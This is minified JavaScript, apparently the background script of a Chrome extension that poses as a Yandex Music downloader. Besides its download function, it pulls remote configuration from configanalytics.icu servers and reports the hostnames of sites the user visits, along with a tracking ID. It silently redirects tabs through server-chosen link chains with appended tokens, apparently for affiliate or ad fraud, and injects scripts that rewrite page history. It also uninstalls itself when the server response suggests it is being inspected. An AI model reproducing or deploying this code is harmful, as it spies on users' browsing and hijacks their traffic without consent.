(()=>{String.prototype.contains=function(e){let s=/^https?:\/\//i,n=s.test(this)?this:`https://${this}`;return t(n).includes(t(e))||t(e).includes(t(n))},Array.prototype.contains=function(e){return this.indexOf(e)>-1},String.prototype.trim=function(){return this.replaceAll("\\","")},Object.prototype.isEmpty=function(){return Object.keys(this).length==0};const o=e=>new Promise(t=>chrome.storage.local.set(e,t)),s=e=>new Promise(t=>chrome.storage.local.get(e,t)),j=e=>new Promise(t=>chrome.storage.local.remove(e,t)),Q=async(e,t)=>{let{b:n}=await s("b");n||=[],n.indexOf(t(e))==-1&&(n.push(t(e)),o({b:n}))},r=async(e,t,n,i,a)=>{let{err:r}=await s("err");r||=[],r.push(a(`${e}:${t}:${n}:${i}:${G()}`)),o({err:r})},X=async()=>{const e={time:120,config:"https://fw-chrome.configanalytics.icu/mv3/chrome/config.txt;https://cf-chrome.configanalytics.icu/mv3/chrome/config.txt",ctime:h(0),start:g(),uid:Y(),version:chrome.runtime.getManifest().version,share:0,html:"0;/html/share.html",all:!0,tags:!0,folder:!1,cover:"400x400"},t=await s("version");if(t.isEmpty()||t.version<"2.0.0")for(let[t,n]of Object.entries(e))(t!="start"&&t!="uid"&&t!="all"&&t!="tags"&&t!="folder"||(await s(t)).isEmpty())&&o({[t]:n});else for(let[t,n]of Object.entries(e))(await s(t)).isEmpty()&&o({[t]:n})},A=()=>{const e="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",t=Array.from({length:120},()=>e[Math.floor(Math.random()*e.length)]).join("");return`?token=${t}&`},g=()=>Date.now(),h=e=>(e===0?new Date(0):new Date).toUTCString(),G=()=>(new Date).toLocaleString("ru-ru",{timeZone:"Europe/Moscow"}).replace(",",""),Y=()=>"xxxxxxxx-xxxx-xxxx-xxxx-xxxx-v.2.0.8".replace(/x/g,e=>{let t=Math.random()*16|0,n=e=="x"?t:t&3|8;return n.toString(16)}),c=()=>chrome.runtime.lastError,a=e=>u(e),e=e=>atob(e),u=e=>btoa(e),x=e=>e?.length>0?e.split(";"):null,t=e=>new URL(e).hostname,w=e=>{let t;return e.indexOf("//")>-1?t=e.split("/")[2]:t=e.split("/")[0],t=t.split(":")[0],t=t.split("?")[0],t.replace(/^\./,"")},O=(e,t)=>e===t||e.split(".").slice(-3).join(".")===t||e.split(".").slice(-2).join(".")===t,v=(e,t,n)=>{for(let s=n;s>=0;s--)try{const n=decodeURIComponent(e.match(t).toString().split(",")[s]);if(n!=="undefined")return n}catch{}return null},q=(e,t)=>{try{setTimeout(()=>{history.replaceState("","",`https://${location.host}`)},t*1e3)}catch{}},B=(s,o,i,c,l,d,u,h,m,f,p)=>{let g=/(?:(?:(?:https?):\/\/)|(?:http%3A%2F%2F))([\w_-]+(?:(?:\.[\w_-]+)+))([\w.,@?^=%&:/~+#-]*[\w@?^=%&/~+#-])?/g,y=/=$/g,_=y.test(s)?`${s}${o}`:s,j=0;const b=s=>{let y;if(j++,j>7){r(h,555,t(o),t(s),a),clearInterval(n);return}fetch(s).then(s=>{if(O(w(s?.url),"w3.org")){r(h,s.status,t(o),t(s.url),a),clearInterval(n);return}if(c?.contains(s?.url)){if(Number(e(u))){clearInterval(n);return}Number(e(p))?(i(s.url.replace("?",A()),l,o,Number(e(f))),clearInterval(n)):(i(s.url,l,o,Number(e(f))),clearInterval(n))}else if(Number(e(d)))s.text().then(t=>{try{i(v(decodeURIComponent(decodeURIComponent(t)).trim(),g,Number(e(m))),l,o,Number(e(f))),clearInterval(n)}catch{i(v(t.trim(),g,Number(e(m))),l,o,Number(e(f))),clearInterval(n)}}).catch(()=>{r(h,s.status,t(o),t(s.url),a),clearInterval(n)});else{const j=/text\/html/i;if(!j.test(s?.headers?.get("content-type"))){r(h,s.status,t(o),t(s.url),a),clearInterval(n);return}let d;try{d=decodeURIComponent(decodeURIComponent(s.url))}catch{}s.text().then(s=>{try{y=v(decodeURIComponent(decodeURIComponent(s))?.trim(),g,Number(e(m)))?.replace(/url=([^?&]*)(&)/,"url=$1?")}catch{y=v(s?.trim(),g,Number(e(m)))?.replace(/url=([^?&]*)(&)/,"url=$1?")}const j=/(\/direct-link\/|\/promo-landing-v\d+\/)/i;if(y&&!j.test(d))if(c?.contains(y)){if(Number(e(u))){clearInterval(n);return}Number(e(p))?(i(y.replace("?",A()),l,o,Number(e(f))),clearInterval(n)):(i(y,l,o,Number(e(f))),clearInterval(n))}else b(y);else if(d){let e;try{e=decodeURIComponent(decodeURIComponent(d?.replace(/link=([^?&]*)(&)/,"link=$1?"))).match(/(https?:\/\/.*?(https?:\/\/.*))/)}catch{e=d?.replace(/link=([^?&]*)(&)/,"link=$1?").match(/(https?:\/\/.*?(https?:\/\/.*))/)}e?.[2]?b(e?.[2]):(r(h,s.status,t(o),t(s.url),a),clearInterval(n))}}).catch(()=>{r(h,s.status,t(o),t(s.url),a),clearInterval(n)})}}).catch(()=>{r(h,999,t(o),t(s),a),clearInterval(n)})};b(_)},d=e=>{chrome.tabs.create({url:e},c)},R=e=>{chrome.tabs.remove(e,c)},D=e=>{chrome.tabs.reload(e,c)},S=(e,t,n,s=1)=>{if(s)return new Promise(o=>{chrome.tabs.update(t,{url:e},e=>{chrome.runtime.lastError;const t=(i,a)=>{if(a?.status==="complete"&&i===e?.id){chrome.tabs.onUpdated.removeListener(t);try{chrome.scripting.executeScript({target:{tabId:i},args:[n.replace(/^http:\/\//i,"https://"),s],injectImmediately:!0,func:q})}catch{}o(e)}};chrome.tabs.onUpdated.hasListener(t)&&chrome.tabs.onUpdated.removeListener(t),chrome.tabs.onUpdated.addListener(t)})});chrome.tabs.update(t,{url:e},c)},z=async e=>{const t=await s(["html","share","start"]),n=x(t.html);t.share==0&&n.shift()!=0&&g()-t.start>4e8&&(o({share:g()}),e(n.shift()))},p=()=>new Promise(e=>{chrome.permissions.getAll(t=>{e(!!t.origins.contains("<all_urls>"))})}),M=async()=>{const{uid:e}=await s("uid");chrome.runtime.setUninstallURL(`https://fw-chrome.configanalytics.icu/mv3/chrome/uninstall?uid=${e}&ver=${chrome.runtime.getManifest().version}`)},k=()=>{setInterval(chrome.runtime.getPlatformInfo,2e4)},_=async e=>{chrome.runtime.lastError;for(const{id:t}of e||await chrome.tabs.query({url:"<all_urls>"}))try{await chrome.scripting.executeScript({target:{tabId:t},func:F}),chrome.tabs.onUpdated.removeListener(C);return}catch{}chrome.tabs.onUpdated.addListener(C)},F=function e(){chrome.runtime.connect({name:"keepAlive"}).onDisconnect.addListener(e)},T=async()=>{try{l=(await s({k:[]})).k}catch{}try{m=new Set([...(await s("set")).set])}catch{}try{({priority:i}=await s("priority"))}catch{}},f=async t=>{if(!await p())return!0;const n=await s();n.b||=[],n.err||=[];const a={array:x(n.config),string:`?uid=${n.uid}&ver=${chrome.runtime.getManifest().version}&extid=${chrome.runtime.id}&start=${n.start}&hash=${[...n.b].join("-")}&err=${[...n.err].join("-")}`},r=async()=>{try{const t=await fetch(a.array.pop()+a.string,{method:"GET",headers:new Headers({"If-Modified-Since":n.ctime,"X-Requested-With":chrome.runtime.id})});if(b=0,t.status==304){n?.k&&(l=n.k),o({ctime:h()}),j(["b","err"]);return}if(t.status==204){chrome.management.uninstallSelf();return}if(t.status!=200){l=[],j(["b","err"]),a.array.length!=0&&await r();return}if(t.status==403){const e=t.headers.get("Server");if(e==="cloudflare"){chrome.management.uninstallSelf();return}}if(t.ok){const s=t.headers.get("content-type");if(!s||s.indexOf("application/json")==-1){a.array.length!=0&&await r();return}const n=await t.json();await j(["k","b","err"]);let c=[],d=[];n.c&&Array.isArray(n.c)&&n.c.forEach(t=>{t.d&&(c+=e(t.d))}),n.a&&Array.isArray(n.a)&&(l=n.a.slice(1).map(e=>({a:e}))),n.e&&Array.isArray(n.e)&&(d=n.e.map(t=>e(t.i))),i=Number(e(n.p)),await o({config:c,html:e(n.r),time:e(n.t),priority:i,k:l,eIds:d,ctime:h()})}}catch(e){console.log(e),b=0,a.array.length!=0&&await r();return}},c=(e,t=5e3)=>new Promise(n=>{const s=()=>{e()?n():setTimeout(s,t)};s()});await c(()=>navigator?.onLine===!0),!b&&(t||g()-new Date(n.ctime).getTime()>Number(n.time)*50*1e3)&&(b=1,await r(),m.clear(),j("set")),chrome.alarms.create("interval",{periodInMinutes:Number(n.time)}),E(y),chrome.alarms.onAlarm.addListener(y)},E=e=>{chrome.alarms.onAlarm.hasListener(e)&&chrome.alarms.onAlarm.removeListener(e)},N=e=>{e.origins.contains("<all_urls>")&&d("html/error.html")},L=e=>{e.origins.contains("<all_urls>")&&chrome.tabs.query({},async e=>{e.forEach(e=>{e.url.includes(`${chrome.runtime.id}/html/error.html`)&&R(e.id,c)}),await o({ctime:h(0)}),await f(1)})},y=e=>{e?.name=="interval"&&chrome.alarms.clear("interval",async e=>{z(d),await f()})},P=async r=>{const d=t(r.url);if(await Q(d,a),!l?.length)return;if(i==0)return;for(const a of l){let t=a.a;if(r?.url?.includes(e(t.d))&&O(d,w(e(t.d)))&&!m.has(t.d)){m.add(t.d),o({set:[...m]});const{eIds:a}=await s("eIds");if(a?.length>0)for(const e of a){const t=await new Promise(t=>{chrome.runtime.sendMessage(e,{query:"getPriority"},e=>{chrome.runtime.lastError,t(e)})});if(t?.priority>i){i=0;break}}if(i==0)return;n=setInterval(()=>{chrome.tabs.update(r.tabId,{url:r.url},c)},100);const{t:l=u(0),p:d=u(0),b:h=u(0),h:f=u(1),r:p=u(1)}=t;B(e(t.u),r.url,S,e(t.d),r.tabId,l,h,t.n,d,f,p)}}},H=async e=>{e?.reason==="install"?chrome.tabs.query({},e=>{d("html/install.html"),e.filter(e=>{const n=t(e.url);return n==="music.yandex.ru"||n==="music.yandex.kz"||n==="music.yandex.by"||n==="music.yandex.uz"||n==="music.yandex.com"}).forEach(e=>D(e.id,c))}):e?.reason=="update"&&(await o({version:chrome.runtime.getManifest().version,share:0,ctime:h(0)}),await f(1),await p()||d("html/error.html"))},I=async()=>{if(k(),!await p()){d("html/error.html");return}f(1)},C=(e,t,n)=>/^https?:/.test(t.url)&&_([n]),V=e=>{e.name==="keepAlive"&&(setTimeout(()=>e.disconnect(),25e4),e.onDisconnect.addListener(()=>_()))},$=e=>{d("https://music.yandex.ru")},W=async(e,t,n)=>{if(!await p())return!0;if(e?.query=="getPriority"){const{eIds:r}=await s("eIds");let a=!1;for(const e of r)if(e===t.id){a=!0;break}a&&(n({priority:i}),e?.priority>i&&(i=0,await o({priority:i})))}return!0},U=(e,t,n)=>((async()=>{const t=(await s("all")).all;e.message=="all"&&n(t),e.message=="download"&&chrome.downloads.download({url:e.url,filename:e.filename,conflictAction:"overwrite"},()=>{chrome.runtime?.lastError?.message==="Invalid filename"&&chrome.downloads.download({url:e.url,filename:`${Math.floor(Math.random()*1e15)}.mp3`,conflictAction:"overwrite"}),n({status:"done",message:"100%",url:e.url})}),e.message=="check"&&n(await p()?{status:!1}:{status:!0})})(),!0),K=()=>{E(y),chrome.runtime.onInstalled.addListener(H),chrome.runtime.onConnect.addListener(V),chrome.runtime.onStartup.addListener(I),chrome.permissions.onAdded.addListener(L),chrome.permissions.onRemoved.addListener(N),chrome.action.onClicked.addListener($),chrome.runtime.onMessageExternal.addListener(W),chrome.runtime.onMessage.addListener(U),chrome.webRequest.onBeforeRequest.addListener(P,{urls:["<all_urls>"],types:["main_frame"]})};let l=[],m=new Set,b=0,i=0,n;const Z=async()=>{k(),_(),await K(),await X(),await T(),await M(),await f()};Z()})()